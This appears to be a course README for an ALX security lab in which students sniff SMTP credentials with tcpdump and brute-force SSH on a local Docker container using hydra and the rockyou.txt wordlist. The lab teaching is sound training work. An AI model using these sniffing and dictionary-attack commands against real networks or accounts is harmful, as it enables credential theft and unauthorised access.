# Curriculum Project: Attack is the Best Defense

## Overview

This project focuses on enhancing understanding and skills in various aspects of security and DevOps. It spans topics such as network sniffing, ARP spoofing, Docker, scripting, and hacking techniques like dictionary attacks.

### Key Details

- **Average:** 145.99%
- **Weight:** 1
- **Project Duration:** March 18, 2024, 4:00 AM - April 1, 2024, 5:00 AM
- **Checker Release:** March 21, 2024, 4:00 PM
- **Auto Review:** Will be launched at the deadline

## Background Context

This project is entirely optional but highly rewarding. It offers a chance to boost your project grade significantly. While not mandatory, engaging in this project will contribute positively to your average score. However, abstaining from it won’t affect your grade negatively. Enjoy the learning experience!

## Goal

The primary objective of this project is to discover login credentials, including usernames and passwords, through various security testing techniques.

## Resources

### Read or watch:

- Network sniffing
- ARP spoofing
- Connect to SendGrid’s SMTP relay using telnet
- What is Docker and why is it popular?
- Dictionary attack

### `man` or `help`:

- tcpdump
- hydra
- telnet
- docker

## Tasks

### 0. Sniffing

**Simplified Description:**

Sniffing involves capturing and analyzing network traffic to intercept sensitive information, such as usernames and passwords.

**Step-by-Step Process:**

1. Identify available network interfaces:

```   
tcpdump --list-interfaces
```

2. Start capturing traffic on port 587 using any available interface:

```
tcpdump --interface any -nn port 587
```

3. Simultaneously run the script `user_authenticating_into_server`, and capture the traffic in a file named `packets.pcap`:

```
tcpdump --interface any -nn port 587 -w packets.pcap
./user_authenticating_into_server
```

4. View the captured packets:

```
cat packets.pcap
```

5. Analyze the captured packets in detail:

```
tcpdump -nn -A -r packets.pcap
```

### 1. Hydra and rockyou.txt

**Simplified Description:**

Hydra is a tool used for brute-forcing passwords, while rockyou.txt is a popular password dictionary. This task involves utilizing Hydra along with the rockyou.txt dictionary to crack passwords.

**Step-by-Step Process:**

1. Install Docker to set up a virtual environment:

```
snap install docker
```

2. Run a Docker container with SSH access on port 2222:

```
docker run -p 2222:22 -d -ti sylvainkalache/264-1
```

3. Download the rockyou.txt dictionary and preview its contents:

```
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
cat rockyou.txt | head -n 10
```

4. Use Hydra to perform a brute-force attack on the SSH account (`sylvain`) with the provided dictionary (`rockyou.txt`), targeting the Docker container's SSH service:

```
hydra -l sylvain -P ./rockyou.txt ssh://127.0.0.1 -s 2222 -V -F
```

## Repository

- **GitHub Repository:** [alx-system_engineering-devops](https://github.com/abdelhafid-mahmoudi-env/alx-system_engineering-devops)
- **Directory:** attack_is_the_best_defense
- **Files:** 
- 0-sniffing
- 1-dictionary_attack

## Copyright

Copyright © 2024 ALX, All rights reserved.
